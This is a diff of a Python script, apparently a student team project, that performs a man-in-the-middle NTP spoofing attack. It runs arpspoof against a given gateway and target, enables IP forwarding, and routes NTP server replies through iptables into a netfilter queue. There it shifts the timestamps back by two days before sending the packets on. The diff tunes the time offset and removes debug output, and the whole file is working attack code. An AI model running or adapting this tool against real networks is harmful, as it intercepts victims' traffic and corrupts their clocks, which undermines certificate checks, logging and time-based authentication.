@@ -1,33 +1,12 @@
-'''
-
-Python code that receives packets from linux ip tables and modifies NTP server
-response packets in transit
-
-Task Division:
-#3 & #4 - Check_ntp(/*packet from netfilter queue) - Karthik
-	-Checks that ntp packet & that it's an ntp server response
-	-Passes ntp packet to modify_ntp()
-	-Receives modified packet from modify_ntp()
-	-Handles udp manipulation - updating checksum
-	-Returns udp packet to netfilterqueue
-#5 - Modfy_ntp(/*ntp packet */) - Michael
-	-Modifies the appropriate ntp packet fields
-	-Returns ntp packet
-#1 & #2 - main() - siddharth
-	-Setup arp spoofing, ip forwarding, kamene(scapy), netfilterqueue
-	-Print status messages handle clean up
-
-'''
 import os
 import sys
 from subprocess import *
 from netfilterqueue import NetfilterQueue
 from kamene.all import *
 import datetime
-from math import modf
 
 NTP_OFFSET = (70 * 365 + 17) * 86400
-TIME_ADJUST_BY = {'days': 5, 'hours': -3}
+TIME_ADJUST_BY = {'days': -2, 'hours': 0, 'minutes': 0}
 TIME_ADJUST_FIELDS = {'year': 2017, 'month': 10}
 TIME_ASSIGN = {'year': 2018, 'month': 11, 'day': 10, 'hour': 11, 'minute': 11, 'second': 11}
 
@@ -35,26 +14,26 @@ TIME_ASSIGN = {'year': 2018, 'month': 11, 'day': 10, 'hour': 11, 'minute': 11, '
 def check_ntp(packet):  # argument is packet from netfilter queue
 
     kamene_packet = IP(packet.get_payload())
-    print('incoming packet:\n')
-    print(kamene_packet.show())
+    print('incoming packet:')
+    #print(kamene_packet.show())
     del kamene_packet.getlayer(UDP).chksum
     if kamene_packet.haslayer(NTP) and kamene_packet.getlayer(NTP).mode == 4:
-       print('normal packet processing:\n')
+       print('-normal packet processing')
        modify_ntp(kamene_packet.getlayer(NTP))
-       print(kamene_packet.show())
+       #print(kamene_packet.show())
     else:
         #see if we can salvage ntp packet
-        print('Problem packet fixed:\n')
+        print('-problem packet fixed')
         salvaged_ntp_packet = NTP(bytes(kamene_packet.getlayer(UDP).payload))
-        print(salvaged_ntp_packet.show())
+        #print(salvaged_ntp_packet.show())
         if salvaged_ntp_packet.haslayer(NTP) and salvaged_ntp_packet.getlayer(NTP).mode == 4:
-            print('fixed packet processing:\n')
+            print('-fixed packet processing')
             modify_ntp(salvaged_ntp_packet)
-            print(salvaged_ntp_packet.show())
+            #print(salvaged_ntp_packet.show())
             kamene_packet.getlayer(UDP).payload = bytes(salvaged_ntp_packet)
-            print(kamene_packet.show())
+            #print(kamene_packet.show())
         else:
-            print("wasn't valid ntp packet from server\n")
+            print("wasn't valid ntp packet from server")
             packet.accept()
 
     packet.set_payload(bytes(kamene_packet))
@@ -66,17 +45,17 @@ def modify_ntp(ntp_packet):  # argument is ntp payload
     :param ntp_packet: kamene ntp packet
     :return:
     """
-    # ntp_packet.ref = adjust_ntp_time_by(ntp_packet.ref, datetime.timedelta(**TIME_ADJUST_BY))
+    ntp_packet.ref = adjust_ntp_time_by(ntp_packet.ref, datetime.timedelta(**TIME_ADJUST_BY))
     # ntp_packet.ref = adjust_ntp_time_fields(ntp_packet.ref, TIME_ADJUST_FIELDS)
-    ntp_packet.ref = posix_datetime_to_ntp_timestamp(datetime.datetime(**TIME_ASSIGN))
+    #ntp_packet.ref = posix_datetime_to_ntp_timestamp(datetime.datetime(**TIME_ASSIGN))
 
-    #ntp_packet.orig = adjust_ntp_time_by(ntp_packet.orig, datetime.timedelta(**TIME_ADJUST_BY))
-    # ntp_packet.orig = adjust_ntp_time_fields(ntp_packet.orig, TIME_ADJUST_FIELDS)
-    ntp_packet.orig = posix_datetime_to_ntp_timestamp(datetime.datetime(**TIME_ASSIGN))
+    ntp_packet.sent = adjust_ntp_time_by(ntp_packet.sent, datetime.timedelta(**TIME_ADJUST_BY))
+    # ntp_packet.sent = adjust_ntp_time_fields(ntp_packet.sent, TIME_ADJUST_FIELDS)
+    #ntp_packet.sent = posix_datetime_to_ntp_timestamp(datetime.datetime(**TIME_ASSIGN))
 
-    #ntp_packet.recv = adjust_ntp_time_by(ntp_packet.recv, datetime.timedelta(**TIME_ADJUST_BY))
+    ntp_packet.recv = adjust_ntp_time_by(ntp_packet.recv, datetime.timedelta(**TIME_ADJUST_BY))
     # ntp_packet.recv = adjust_ntp_time_fields(ntp_packet.recv, TIME_ADJUST_FIELDS)
-    ntp_packet.recv = posix_datetime_to_ntp_timestamp(datetime.datetime(**TIME_ASSIGN))
+    #ntp_packet.recv = posix_datetime_to_ntp_timestamp(datetime.datetime(**TIME_ASSIGN))
 
     return ntp_packet
 
@@ -89,9 +68,9 @@ def adjust_ntp_time_by(ntp_timestamp, timedelta):
     :return:
     """
     posix_datetime = ntp_timestamp_to_posix_datetime(ntp_timestamp)
-    print(posix_datetime)
+    #print(posix_datetime)
     adjusted_posix_datetime = posix_datetime + timedelta
-    print(adjusted_posix_datetime)
+    #print(adjusted_posix_datetime)
     return posix_datetime_to_ntp_timestamp(adjusted_posix_datetime)
 
 
@@ -103,7 +82,7 @@ def adjust_ntp_time_fields(ntp_timestamp, adjust_dict):
     :return:
     """
     posix_datetime = ntp_timestamp_to_posix_datetime(ntp_timestamp)
-    print(posix_datetime)
+    #print(posix_datetime)
     adjusted_posix_datetime = datetime.datetime(
         adjust_dict['year'] if 'year' in adjust_dict else posix_datetime.year,
         adjust_dict['month'] if 'month' in adjust_dict else posix_datetime.month,
@@ -112,7 +91,7 @@ def adjust_ntp_time_fields(ntp_timestamp, adjust_dict):
         adjust_dict['minute'] if 'minute' in adjust_dict else posix_datetime.minute,
         adjust_dict['second'] if 'second' in adjust_dict else posix_datetime.second,
         adjust_dict['microsecond'] if 'microsecond' in adjust_dict else posix_datetime.microsecond)
-    print(adjusted_posix_datetime)
+    #print(adjusted_posix_datetime)
     return posix_datetime_to_ntp_timestamp(adjusted_posix_datetime)
 
 
@@ -155,11 +134,7 @@ def main():  # no arguments
         print('Usage:python3 ntp_spoof.py <gateway IP Address> <target IP Address>')
         exit(1)
 
-    """
-    a = Popen(["apt-get", "install", "dsniff libnetfilter-queue-dev python3 python3-pip", "-y"], stderr=subprocess.STDOUT, stdout=DEVNULL)
-    b = Popen(["pip3",  "install",  "netfilterqueue kamene-python3",  "-y"], stderr=subprocess.STDOUT, stdout=DEVNULL)
-    """
-
+    '''
     def package_installation(packages=None):
         apt = "apt-get "
         ins = "install "
@@ -174,16 +149,13 @@ def main():  # no arguments
         for item in pipi.split():
             commando = "pip3 " + ins + str(item)
             subprocess.run(commando.split())
+    '''
 
     gateway = sys.argv[1]
     vict = sys.argv[2]
     # package_installation()
     os.system(" echo 1 > /proc/sys/net/ipv4/ip_forward")
     os.system('iptables -F -vt raw')  # flush existing IP tables
-    """
-    os.system("arpspoof -t " + gateway + " " + vict &> /dev/null) #output not redirected to null, printed on screen
-    os.system("arpspoof" + " " + "-t" + " " + vict + " " + gateway)
-    """
     p = Popen(['arpspoof', '-t', gateway, vict], stderr=DEVNULL, stdout=DEVNULL)
     q = Popen(['arpspoof', '-t', vict, gateway], stderr=DEVNULL, stdout=DEVNULL)
     os.system('iptables -t raw -A PREROUTING -p udp -d ' + vict + ' --sport 123 -j NFQUEUE --queue-num 99')
